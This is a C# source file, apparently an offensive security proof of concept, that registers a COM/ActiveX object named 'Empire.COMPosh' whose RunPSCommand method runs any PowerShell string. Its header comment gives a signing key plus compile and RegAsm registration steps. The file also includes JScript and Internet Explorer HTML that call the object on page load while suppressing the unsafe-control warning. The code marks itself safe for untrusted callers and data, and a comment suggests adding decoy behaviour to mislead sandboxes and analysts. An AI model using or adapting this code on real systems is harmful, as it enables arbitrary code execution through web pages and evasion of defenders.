using System;
using System.IO;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;
 
//Add For PowerShell Invocation
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;
 
/*
Author: Casey Smith, Twitter: @subTee
 
License: BSD 3-Clause
 
$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
$Content = [System.Convert]::FromBase64String($key)
Set-Content key.snk -Value $Content -Encoding Byte
 
 
Step One: Compile
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe  /reference:"C:\Program Files\Reference Assemblies\Microsoft\WindowsPowerShell\v1.0\System.Management.Automation.dll" /out:pshell.exe /keyfile:key.snk EmpireCOMPosh.cs
 
Step Two:
x86
C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm /codebase /tlb pshell.exe
x64
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm /codebase /tlb pshell.exe
 
//This matters so that on x64 systems you can create the objects. Otherwise you must use x86 version of cscript
//Best to register both on x64 systems.  IMHO
 
From Jscript
var o = new ActiveXObject("Empire.COMPosh");
o.RunPSCommand("[Math]::Sqrt([Math]::Pi)");
 
From IE via HTML - Without that pesky "unsafe" alert ;-)
 
<html>
<head> <title>Empire</title> </head>
<body onload="EmpireLoad();">
<h1>This is Our Test Page <h1>
 
<script type ="text/javascript">
function EmpireLoad()
{
    var myEmpire = new ActiveXObject("Empire.COMPosh");
    alert(myEmpire.RunPSCommand("[Math]::Sqrt([Math]::Pi)"));
}
</script>
</body></html>
 
*/
 
public class Program
{
    public static void Main()
    {
        Console.WriteLine("Hello From Main...I Don't Do Anything");
        //Add any behaviour here to throw off sandbox execution/analysts :)
        //Not Actually Necessary 
    }
     
}
 
// A very simple interface to test ActiveX with.
 
[
    Guid( "06AE8B00-9DBE-4BC4-B098-461C529DF18A"),
    InterfaceType( ComInterfaceType.InterfaceIsDual),
    ComVisible( true)
]
public interface IHeartEmpire
{
    [DispId(1)]
    string RunPSCommand(string cmd);
     
};
 
[
    Serializable,
    ComVisible(true)
]
public enum ObjectSafetyOptions
{
    INTERFACESAFE_FOR_UNTRUSTED_CALLER = 0x00000001,
    INTERFACESAFE_FOR_UNTRUSTED_DATA = 0x00000002,
    INTERFACE_USES_DISPEX = 0x00000004,
    INTERFACE_USES_SECURITY_MANAGER = 0x00000008
};
 
//
// MS IObjectSafety Interface definition
//
[
    ComImport(),
    Guid("CB5BDC81-93C1-11CF-8F20-00805F2CD064"),
    InterfaceType(ComInterfaceType.InterfaceIsIUnknown)
]
public interface IObjectSafety
{
    [PreserveSig]
    long GetInterfaceSafetyOptions( ref Guid iid, out int pdwSupportedOptions, out int pdwEnabledOptions);
 
    [PreserveSig]
    long SetInterfaceSafetyOptions( ref Guid iid, int dwOptionSetMask, int dwEnabledOptions);
};
 
//
// Provides a default Implementation for
// safe scripting.
// This basically means IE won't complain about the
// ActiveX object not being safe ;-)
//
public class IObjectSafetyImpl : IObjectSafety
{
    private ObjectSafetyOptions m_options =
        ObjectSafetyOptions.INTERFACESAFE_FOR_UNTRUSTED_CALLER | 
        ObjectSafetyOptions.INTERFACESAFE_FOR_UNTRUSTED_DATA;
 
    #region [IObjectSafety implementation]
    public long GetInterfaceSafetyOptions( ref Guid iid, out int pdwSupportedOptions, out int pdwEnabledOptions)
    {
        pdwSupportedOptions = (int)m_options;
        pdwEnabledOptions = (int)m_options;
        return 0;
    }
 
    public long SetInterfaceSafetyOptions(ref Guid iid, int dwOptionSetMask, int dwEnabledOptions)
    {
        return 0;
    }
    #endregion
};
 
 
 
[
        Guid("DDCCB08C-CB89-4530-87D1-ABB203B4C593"),
 
        // This is basically the programmer friendly name
        // for the guid above. We define this because it will
        // be used to instantiate this class. I think this can be
        // whatever you want. Generally it is
        // [assemblyname].[classname]
        ProgId("Empire.COMPosh"),
 
        // No class interface is generated for this class and
        // no interface is marked as the default.
        // Users are expected to expose functionality through
        // interfaces that will be explicitly exposed by the object
        // This means the object can only expose interfaces we define
        ClassInterface(ClassInterfaceType.None),
 
        // Set the default COM interface that will be used for
        // Automation. Languages like: C#, C++ and VB
        // allow to query for interface's we're interested in
        // but Automation only aware languages like JavaScript do
        // not allow to query interface(s) and create only the
        // default one
        ComDefaultInterface(typeof(IHeartEmpire)),
        ComVisible(true)
    ]
public class EmpireCOMPosh : IObjectSafetyImpl, IHeartEmpire 
{
 
    //Based on Jared Atkinson's And Justin Warner's Work
    public string RunPSCommand(string cmd)
    {
        //Init stuff
        Runspace runspace = RunspaceFactory.CreateRunspace();
        runspace.Open();
        RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
        Pipeline pipeline = runspace.CreatePipeline();
 
        //Add commands
        pipeline.Commands.AddScript(cmd);
 
        //Prep PS for string output and invoke
        pipeline.Commands.Add("Out-String");
        Collection<PSObject> results = pipeline.Invoke();
        runspace.Close();
 
        //Convert records to strings
        StringBuilder stringBuilder = new StringBuilder();
        foreach (PSObject obj in results)
        {
            stringBuilder.Append(obj);
        }
        return stringBuilder.ToString().Trim();
     }
      
     
}